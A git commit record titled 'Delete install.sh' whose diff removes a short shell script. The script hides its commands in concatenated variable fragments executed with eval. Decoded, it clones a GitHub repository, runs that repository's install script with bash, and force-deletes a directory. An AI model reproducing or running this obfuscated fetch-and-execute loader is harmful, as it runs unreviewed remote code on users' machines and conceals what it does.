d10e8dd48b9c7d92979ce838927a4c62f17aece9
lover3418 <lover3418@gmail.com>
2019-12-23 00:44:29 +0530

    Delete install.sh

--- install.sh
+++
@@ -1,3 +0,0 @@
-z="
-";Yz='park';Oz='ne"';Fz='thub';az='p';Vz='cd';Sz=' ins';Cz='e ht';Xz='rf s';Qz='emp';Gz='.com';Wz='rm -';Lz='git';Tz='tall';Zz='/tem';Bz='clon';Jz='18/t';Hz='/lov';Ez='//gi';Az='git ';Pz='cd t';Nz=' "do';Uz='.sh';Iz='er34';Rz='bash';Mz='echo';Kz='emp.';Dz='tps:';
-eval "$Az$Bz$Cz$Dz$Ez$Fz$Gz$Hz$Iz$Jz$Kz$Lz$z$Mz$Nz$Oz$z$Pz$Qz$z$Rz$Sz$Tz$Uz$z$Vz$z$Wz$Xz$Yz$Zz$az"
